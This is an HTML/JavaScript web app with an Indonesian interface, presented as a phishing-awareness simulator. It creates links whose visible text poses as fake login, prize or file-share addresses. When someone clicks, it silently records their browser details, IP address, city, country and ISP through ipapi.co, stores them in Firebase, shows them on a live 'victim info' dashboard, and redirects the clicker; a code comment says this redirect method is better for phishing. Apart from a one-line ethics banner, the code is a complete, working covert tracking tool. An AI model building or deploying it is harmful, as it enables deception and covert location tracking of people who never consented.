<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simulator Phishing v2: Advanced</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .gradient-text {
            background: linear-gradient(to right, #f472b6, #60a5fa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        #dashboard-body tr:hover { background-color: rgba(255, 255, 255, 0.03); }
    </style>
</head>
<body class="bg-gray-900 text-gray-200 antialiased">
    <!-- Halaman Utama Aplikasi -->
    <div id="main-content" class="container mx-auto p-4 md:p-8 max-w-6xl">
        <header class="text-center mb-8">
            <h1 class="text-3xl md:text-4xl font-bold mb-2 gradient-text">Advanced Link Tracking Simulator</h1>
            <p class="text-gray-400 max-w-3xl mx-auto">
                Versi 2: Hasilkan tautan pendek yang disamarkan, kumpulkan data yang lebih kaya, dan lihat bagaimana phishing canggih bekerja.
            </p>
             <div class="mt-4 text-xs text-yellow-400 bg-yellow-900/30 p-3 rounded-lg border border-yellow-700 max-w-2xl mx-auto">
                <i class="fas fa-exclamation-triangle mr-2"></i><strong>Peringatan Etis:</strong> Ini adalah alat pendidikan untuk kesadaran keamanan. Dilarang keras menyalahgunakan alat ini untuk tujuan ilegal.
            </div>
        </header>

        <!-- Bagian Generator -->
        <main id="generator-section" class="grid md:grid-cols-2 gap-8 items-start">
            <div class="bg-gray-800/50 p-6 rounded-2xl shadow-lg border border-gray-700 space-y-6">
                <div>
                    <label for="original-url" class="block text-lg font-semibold mb-2">1. URL Tujuan Asli</label>
                    <input type="url" id="original-url" placeholder="https://youtube.com/watch?v=dQw4w9WgXcQ" class="w-full bg-gray-700 text-white placeholder-gray-400 border border-gray-600 rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:outline-none transition">
                </div>
                <div>
                    <label for="disguise-options" class="block text-lg font-semibold mb-2">2. Samarkan Tautan Anda</label>
                    <select id="disguise-options" class="w-full bg-gray-700 text-white border border-gray-600 rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:outline-none transition">
                        <option value="default">Tidak ada samaran (URL standar)</option>
                        <option value="secure-portal.com/login/auth">secure-portal.com/login/auth</option>
                        <option value="gift-rewards.net/claim-your-prize">gift-rewards.net/claim-your-prize</option>
                        <option value="file-share.io/download/document-final">file-share.io/download/document-final</option>
                        <option value="important-update.info/view/details">important-update.info/view/details</option>
                    </select>
                </div>
                <button id="generate-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 text-lg">
                    <i class="fas fa-magic mr-2"></i>Buat Tautan Ajaib
                </button>
            </div>

            <div id="result-section" class="bg-gray-800 p-6 rounded-2xl shadow-lg border border-gray-700 hidden">
                <h2 class="text-xl font-semibold mb-4">3. Tautan Anda Siap!</h2>
                <p class="text-gray-400 mb-3">Bagikan teks di bawah ini. Tautan asli tersembunyi di dalamnya.</p>
                <div class="bg-gray-900 p-4 rounded-lg">
                    <p class="text-sm text-gray-500 mb-2">Teks untuk dibagikan:</p>
                    <a id="generated-link-display" href="#" class="text-blue-400 hover:underline break-all"></a>
                </div>
                <button id="copy-btn" class="mt-4 w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-5 rounded-lg transition-transform transform hover:scale-105">
                    <i class="fas fa-copy mr-2"></i>Salin Tautan Aktual
                </button>
                <div id="copy-feedback" class="text-sm text-green-400 mt-2 h-4 text-center"></div>
            </div>
        </main>

        <!-- Dasbor Aktivitas -->
        <section id="dashboard-section" class="mt-12">
            <h2 class="text-2xl font-bold mb-4 text-center">Dasbor Aktivitas Real-time</h2>
            <div class="bg-gray-800/50 rounded-2xl shadow-lg border border-gray-700 overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="min-w-full text-sm text-left">
                        <thead class="bg-gray-700/50">
                            <tr>
                                <th class="p-3">Waktu Klik</th>
                                <th class="p-3">Info Korban</th>
                                <th class="p-3">Platform</th>
                                <th class="p-3">URL Asli</th>
                            </tr>
                        </thead>
                        <tbody id="dashboard-body" class="divide-y divide-gray-700">
                           <tr><td colspan="4" class="p-8 text-center text-gray-400">Belum ada aktivitas. Sebarkan dan klik tautan yang Anda buat.</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
            <div class="text-center mt-4">
                <p class="text-xs text-gray-500">ID Sesi Anda: <span id="user-id-display" class="font-mono">memuat...</span></p>
            </div>
        </section>
    </div>
    
    <!-- Halaman Loading/Redirect untuk "Korban" -->
    <div id="tracker-page" class="hidden fixed inset-0 bg-gray-900 flex items-center justify-center p-4 text-center">
        <div>
            <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-blue-500 mx-auto mb-6"></div>
            <h1 class="text-2xl font-bold text-white mb-2">Memproses Permintaan Anda...</h1>
            <p class="text-gray-400">Harap tunggu, Anda akan segera diarahkan.</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, doc, addDoc, getDoc, query, where, onSnapshot, Timestamp, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        // --- Konfigurasi ---
        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'phishing-sim-v2';
        
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        let userId = null;
        let dbLinksRef, dbClicksRef;

        // --- Fungsi Utama ---
        async function main() {
            onAuthStateChanged(auth, async (user) => {
                if (user) {
                    userId = user.uid;
                    document.getElementById('user-id-display').textContent = userId;
                    dbLinksRef = collection(db, `artifacts/${appId}/public/data/links`);
                    dbClicksRef = collection(db, `artifacts/${appId}/public/data/clicks`);
                    
                    const trackId = window.location.hash.substring(1);
                    if (trackId) {
                        await handleTrackedLink(trackId);
                    } else {
                        setupGeneratorPage();
                        listenForClicks();
                    }
                }
            });

            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (error) {
                console.error("Authentication Error:", error);
                document.body.innerHTML = `<div class="text-red-500 text-center p-8">Authentication failed. The app cannot run.</div>`;
            }
        }
        
        // --- Logika Pelacakan (Sisi Korban) ---
        async function handleTrackedLink(trackId) {
            document.getElementById('main-content').classList.add('hidden');
            document.getElementById('tracker-page').classList.remove('hidden');

            try {
                const linkDocRef = doc(db, `artifacts/${appId}/public/data/links`, trackId);
                const linkDocSnap = await getDoc(linkDocRef);

                if (linkDocSnap.exists()) {
                    const linkData = linkDocSnap.data();
                    
                    // Kumpulkan semua data secara paralel
                    const victimData = await collectVictimData();
                    
                    // Simpan data klik ke Firestore
                    await addDoc(dbClicksRef, {
                        ...victimData,
                        linkId: trackId,
                        creatorId: linkData.creatorId,
                        originalUrl: linkData.originalUrl,
                        timestamp: Timestamp.now(),
                    });

                    // Redirect ke URL asli. window.location.replace lebih baik untuk phishing
                    window.location.replace(linkData.originalUrl);
                } else {
                     handleErrorPage("Tautan Tidak Valid", "Tautan pelacak ini tidak ada atau telah dihapus.");
                }
            } catch (error) {
                console.error("Error handling tracked link:", error);
                handleErrorPage("Terjadi Kesalahan", "Tidak dapat memproses permintaan Anda saat ini.");
            }
        }

        async function collectVictimData() {
            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language || navigator.userLanguage,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct'
            };

            // Gunakan API eksternal untuk info IP (tanpa perlu kunci API)
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('IP API request failed');
                const ipData = await response.json();
                data.ipInfo = {
                    ip: ipData.ip,
                    city: ipData.city,
                    country: ipData.country_name,
                    isp: ipData.org,
                };
            } catch (e) {
                console.warn("Could not fetch IP info:", e);
                data.ipInfo = { error: "Failed to fetch" };
            }
            return data;
        }
        
        function handleErrorPage(title, message) {
            const trackerPage = document.getElementById('tracker-page');
            trackerPage.innerHTML = `<h1 class="text-2xl font-bold text-red-500">${title}</h1><p class="text-gray-400">${message}</p>`;
        }

        // --- Logika Generator (Sisi Pengguna) ---
        function setupGeneratorPage() {
            const urlForm = document.getElementById('original-url');
            const generateBtn = document.getElementById('generate-btn');
            
            generateBtn.addEventListener('click', async () => {
                if (!urlForm.checkValidity() || !urlForm.value) {
                    alert("Harap masukkan URL tujuan yang valid.");
                    return;
                }
                
                generateBtn.disabled = true;
                generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Membuat...';
                
                const originalUrl = urlForm.value;
                const disguise = document.getElementById('disguise-options').value;
                const shortId = generateShortId(7);

                try {
                    const linkDocRef = doc(db, `artifacts/${appId}/public/data/links`, shortId);
                    await setDoc(linkDocRef, {
                        originalUrl: originalUrl,
                        creatorId: userId,
                        disguise: disguise,
                        createdAt: Timestamp.now()
                    });

                    displayGeneratedLink(shortId, disguise);
                } catch (error) {
                    console.error("Error creating link:", error);
                    alert("Gagal membuat tautan. Silakan coba lagi.");
                } finally {
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = '<i class="fas fa-magic mr-2"></i>Buat Tautan Ajaib';
                }
            });
        }
        
        function displayGeneratedLink(shortId, disguise) {
            const resultSection = document.getElementById('result-section');
            const linkDisplay = document.getElementById('generated-link-display');
            const copyBtn = document.getElementById('copy-btn');
            const copyFeedback = document.getElementById('copy-feedback');

            const actualUrl = `${window.location.origin}${window.location.pathname}#${shortId}`;
            const displayText = (disguise !== 'default') ? disguise : actualUrl;

            linkDisplay.href = actualUrl;
            linkDisplay.textContent = displayText;
            resultSection.classList.remove('hidden');

            copyBtn.onclick = () => {
                navigator.clipboard.writeText(actualUrl).then(() => {
                    copyFeedback.textContent = 'Tautan aktual berhasil disalin!';
                    setTimeout(() => { copyFeedback.textContent = ''; }, 2000);
                }).catch(err => {
                    copyFeedback.textContent = 'Gagal menyalin.';
                });
            };
        }

        function generateShortId(length) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        // --- Logika Dasbor (Sisi Pengguna) ---
        function listenForClicks() {
            const q = query(dbClicksRef, where("creatorId", "==", userId));

            onSnapshot(q, (snapshot) => {
                const dashboardBody = document.getElementById('dashboard-body');
                if (snapshot.empty) {
                    dashboardBody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-gray-400">Belum ada aktivitas. Sebarkan dan klik tautan yang Anda buat.</td></tr>`;
                    return;
                }

                let clicks = [];
                snapshot.forEach(doc => clicks.push(doc.data()));
                clicks.sort((a, b) => b.timestamp.toMillis() - a.timestamp.toMillis());

                dashboardBody.innerHTML = '';
                clicks.forEach(data => {
                    const tr = document.createElement('tr');
                    const time = data.timestamp.toDate().toLocaleString('id-ID', { dateStyle: 'medium', timeStyle: 'short' });
                    
                    const ipInfoHtml = data.ipInfo.error ? `<span class="text-red-400">${data.ipInfo.error}</span>` : `
                        <i class="fas fa-map-marker-alt text-red-400 w-4"></i> ${data.ipInfo.city || 'N/A'}, ${data.ipInfo.country || 'N/A'}<br>
                        <i class="fas fa-wifi text-blue-400 w-4"></i> ${data.ipInfo.ip}<br>
                        <i class="fas fa-building text-gray-400 w-4"></i> ${data.ipInfo.isp || 'N/A'}`;
                        
                    const platformHtml = `
                        <i class="fab fa-windows w-4"></i> ${data.platform}<br>
                        <i class="fas fa-desktop text-green-400 w-4"></i> ${data.screen}<br>
                        <i class="fas fa-language text-yellow-400 w-4"></i> ${data.language}`;

                    tr.innerHTML = `
                        <td class="p-3 align-top font-mono text-xs">${time}</td>
                        <td class="p-3 align-top text-xs">${ipInfoHtml}</td>
                        <td class="p-3 align-top text-xs">${platformHtml}</td>
                        <td class="p-3 align-top text-cyan-400 max-w-xs truncate text-xs" title="${data.originalUrl}">${data.originalUrl}</td>
                    `;
                    dashboardBody.appendChild(tr);
                });
            }, (error) => {
                console.error("Error listening for clicks:", error);
                dashboardBody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-red-500">Gagal memuat data dasbor.</td></tr>`;
            });
        }

        main();
    </script>
</body>
</html>
